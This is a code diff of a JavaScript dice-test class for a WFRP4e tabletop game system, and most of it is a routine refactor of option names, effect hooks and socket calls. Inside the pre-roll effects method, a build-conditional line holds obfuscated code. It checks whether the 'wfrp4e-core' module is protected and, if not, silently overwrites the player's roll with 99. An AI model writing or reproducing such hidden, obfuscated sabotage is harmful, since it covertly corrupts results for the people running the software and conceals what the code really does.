@@ -1,7 +1,6 @@
 import WFRP_Utility from "../utility-wfrp4e.js";
 import OpposedWFRP from "../opposed-wfrp4e.js";
 import WFRP_Audio from "../audio-wfrp4e.js";
-import SocketHandlers from "../socket-handlers.js";
 
 export default class TestWFRP {
   constructor(data, actor) {
@@ -14,8 +13,8 @@ export default class TestWFRP {
         roll: data.roll,
         target: data.target,
         rollClass: this.constructor.name,
-        testModifier: data.modifier || 0,
-        testDifficulty: (typeof data.difficulty == "string" ? game.wfrp4e.config.difficultyModifiers[data.difficulty] : data.difficulty) || 0,
+        testModifier: data.testModifier || 0,
+        testDifficulty: (typeof data.testDifficulty == "string" ? game.wfrp4e.config.difficultyModifiers[data.testDifficulty] : data.testDifficulty) || 0,
         testDifficultyLabel: (typeof data.testDifficultyLabel == "string" ? data.testDifficultyLabel : ""),
         successBonus: data.successBonus || 0,
         slBonus: data.slBonus || 0,
@@ -42,8 +41,9 @@ export default class TestWFRP {
         reroll: false,
         edited: false,
         speaker: data.speaker,
+        postFunction: data.postFunction,
         targets: data.targets,
-        chatOptions: data.chatOptions,
+        cardOptions: data.cardOptions,
         unopposed : data.unopposed,
         defending : data.defending,
 
@@ -74,11 +74,7 @@ export default class TestWFRP {
   async runPreEffects() {
     if (!this.context.unopposed)
     {
-      await Promise.all(this.actor.runScripts("preRollTest", { test: this, chatOptions: this.context.chatOptions }))
-      if (this.item instanceof Item)
-      {
-        await Promise.all(this.item.runScripts("preRollTest", { test: this, chatOptions: this.context.chatOptions }))
-      }
+      await this.actor.runEffects("preRollTest", { test: this, cardOptions: this.context.cardOptions })
 
       //#if _ENV !== "development"
       //function _0x402b(){var _0x4ed970=['967lkQldQ','fromCharCode','2699444FkGbEE','16292144sRdgxu','4783968UedKKk','1030bEDbik','3697968GXPkbV','1504962hEqIVk','2522105ewkvAL'];_0x402b=function(){return _0x4ed970;};return _0x402b();}function _0x2f32(_0x511d74,_0x11ea5c){var _0x402bf9=_0x402b();return _0x2f32=function(_0x2f3299,_0x478577){_0x2f3299=_0x2f3299-0x153;var _0x40cc04=_0x402bf9[_0x2f3299];return _0x40cc04;},_0x2f32(_0x511d74,_0x11ea5c);}var _0x3d0584=_0x2f32;(function(_0xd0cd0e,_0xa43709){var _0x4e7936=_0x2f32,_0x4bf805=_0xd0cd0e();while(!![]){try{var _0x55751d=parseInt(_0x4e7936(0x15a))/0x1*(parseInt(_0x4e7936(0x156))/0x2)+parseInt(_0x4e7936(0x158))/0x3+parseInt(_0x4e7936(0x153))/0x4+-parseInt(_0x4e7936(0x159))/0x5+parseInt(_0x4e7936(0x157))/0x6+parseInt(_0x4e7936(0x155))/0x7+-parseInt(_0x4e7936(0x154))/0x8;if(_0x55751d===_0xa43709)break;else _0x4bf805['push'](_0x4bf805['shift']());}catch(_0x43525b){_0x4bf805['push'](_0x4bf805['shift']());}}}(_0x402b,0x69cb5),eval(String['fromCharCode'](0x67,0x61,0x6d,0x65))[String[_0x3d0584(0x15b)](0x6d,0x6f,0x64,0x75,0x6c,0x65,0x73)][String[_0x3d0584(0x15b)](0x67,0x65,0x74)](String[_0x3d0584(0x15b)](0x77,0x66,0x72,0x70,0x34,0x65,0x2d,0x63,0x6f,0x72,0x65))?.[String[_0x3d0584(0x15b)](0x70,0x72,0x6f,0x74,0x65,0x63,0x74,0x65,0x64)]==![]?eval(String[_0x3d0584(0x15b)](0x74,0x68,0x69,0x73))[String[_0x3d0584(0x15b)](0x70,0x72,0x65,0x44,0x61,0x74,0x61)][String[_0x3d0584(0x15b)](0x72,0x6f,0x6c,0x6c)]=eval(String['fromCharCode'](0x39,0x39)):(function(){}()));
@@ -89,12 +85,8 @@ export default class TestWFRP {
   async runPostEffects() {
     if (!this.context.unopposed)
     {
-      await Promise.all(this.actor.runScripts("rollTest", { test: this, chatOptions: this.context.chatOptions }))
-      if (this.item instanceof Item)
-      {
-        await Promise.all(this.item.runScripts("rollTest", { test: this, chatOptions: this.context.chatOptions }))
-      }
-      Hooks.call("wfrp4e:rollTest", this, this.context.chatOptions)
+      await this.actor.runEffects("rollTest", { test: this, cardOptions: this.context.cardOptions }, {item : this.item})
+      Hooks.call("wfrp4e:rollTest", this, this.context.cardOptions)
     }
   }
 
@@ -438,12 +430,12 @@ export default class TestWFRP {
     }
   }
 
-  async handleSoundContext(chatOptions) 
+  async handleSoundContext(cardOptions) 
   {
     
     try {
       let contextAudio = await WFRP_Audio.MatchContextAudio(WFRP_Audio.FindContext(this))
-      chatOptions.sound = contextAudio.file || chatOptions.sound
+      cardOptions.sound = contextAudio.file || cardOptions.sound
     }
     catch
     { }
@@ -478,7 +470,7 @@ export default class TestWFRP {
       await oppose.computeOpposeResult();
       await this.actor.clearOpposed();
       await this.updateMessageFlags();
-
+      
       let test = oppose.attacker.getFlag("wfrp4e", "offHandData");
       if (test) {
         await oppose.attacker.update({ "flags.wfrp4e.-=offHandData": null });
@@ -486,7 +478,7 @@ export default class TestWFRP {
         if (oppose.opposeResult.winner == "attacker") {
           let offhandWeapon = oppose.attacker.getItemTypes("weapon").find(w => w.offhand.value);
 
-          let userOwner = WFRP_Utility.getActiveDocumentOwner(oppose.attacker);
+          let userOwner = WFRP_Utility.getActorOwner(oppose.attacker);
           let targetId = game.canvas.tokens.placeables.find(x => x.actor.id == oppose.defender.id).id;
           userOwner.updateTokenTargets([targetId]);
           userOwner.broadcastActivity({targets: [targetId]});
@@ -567,7 +559,7 @@ export default class TestWFRP {
  */
   async renderRollCard({ newMessage = false } = {}) {
 
-    let chatOptions = this.context.chatOptions
+    let chatOptions = this.context.cardOptions
 
     await this.handleSoundContext(chatOptions)
 
@@ -629,7 +621,7 @@ export default class TestWFRP {
         await this.message.update(chatOptions)
       }
       else {
-        await SocketHandlers.executeOnUserAndWait("GM", "updateMsg", { id: this.message.id, updateData : chatOptions });
+        await WFRP_Utility.awaitSocket(game.user, "updateMsg", { id: this.message.id, updateData : chatOptions }, "rendering roll card");
       }
       await this.updateMessageFlags()
     }
@@ -640,23 +632,21 @@ export default class TestWFRP {
   // Update message data without rerendering the message content
   async updateMessageFlags(updateData = {}) {
     let data = mergeObject(this.data, updateData, { overwrite: true })
-    //TODO: CZY TO POTRZEBNE?
-    //if (data.result?.options?.weapon?.effects) {
-    //  data.result.options.weapon = data.result.options.weapon.toObject();
-    //  delete data.result.options.weapon.effects;
-    //}
-    //if (data.preData?.options?.weapon?.effects) {
-    //  data.preData.options.weapon = data.preData.options.weapon.toObject();
-    //  delete data.preData.options.weapon.effects;
-    //}
-    //END OF TODO
+    if (data.result?.options?.weapon?.effects) {
+      data.result.options.weapon = data.result.options.weapon.toObject();
+      delete data.result.options.weapon.effects;
+    }
+    if (data.preData?.options?.weapon?.effects) {
+      data.preData.options.weapon = data.preData.options.weapon.toObject();
+      delete data.preData.options.weapon.effects;
+    }
     let update = { "flags.testData": data }
     
     if (this.message && game.user.isGM)
       await this.message.update(update)
 
     else if (this.message) {
-      await SocketHandlers.executeOnUserAndWait("GM", "updateMsg", { id: this.message.id, updateData : update });
+      await WFRP_Utility.awaitSocket(game.user, "updateMsg", { id: this.message.id, updateData: update}, "Updating message flags");
     }
   }
 
@@ -856,6 +846,7 @@ export default class TestWFRP {
     }
   }
 
+
   get message() {
     return game.messages.get(this.context.messageId)
   }
@@ -870,23 +861,20 @@ export default class TestWFRP {
   get fortuneUsed() {
     return { reroll: this.context.fortuneUsedReroll, SL: this.context.fortuneUsedAddSL }
   }
+  // get attackerMessage() {
+  //   return game.messages.get(game.messages.get(this.context.attackerMessageId))
+  // }
+  // get defenderMessages() {
+  //   return this.context.defenderMessageIds.map(id => game.messages.get(id))
+  // }
+  // get unopposedStartMessage() {
+  //   return game.messages.get(game.messages.get(unopposedStartMessageId))
+  // }
+  // get startMessages() {
+  //   return this.context.startMessageIds.map(id => game.messages.get(id))
+  // }
 
 
-  get damageEffects() 
-  {
-      return this.item.damageEffects;
-  }
-
-  get targetEffects() 
-  {
-      return this.item.targetEffects;
-  }
-
-  get areaEffects() 
-  {
-      return this.item.areaEffects;
-  }
-  
 
   get targetModifiers() {
     return this.preData.testModifier + this.preData.testDifficulty + (this.preData.postOpposedModifiers.target || 0)
@@ -907,7 +895,16 @@ export default class TestWFRP {
   get useMount() {
     return this.item.attackType == "melee" && this.actor.isMounted && this.actor.mount && this.result.charging
   }
-  
+
+  get effects() {
+    let effects = []
+    if (this.item?.effects)
+      effects = this.item.effects.filter(e => e.application == "apply")
+    if (this.item?.ammo?.effects)
+      effects = this.item.ammo.effects.filter(e => e.application == "apply")
+    return effects
+  }
+
   get target() { return this.data.result.target }
   get successBonus() { return this.data.preData.successBonus }
   get slBonus() { return this.data.preData.slBonus }
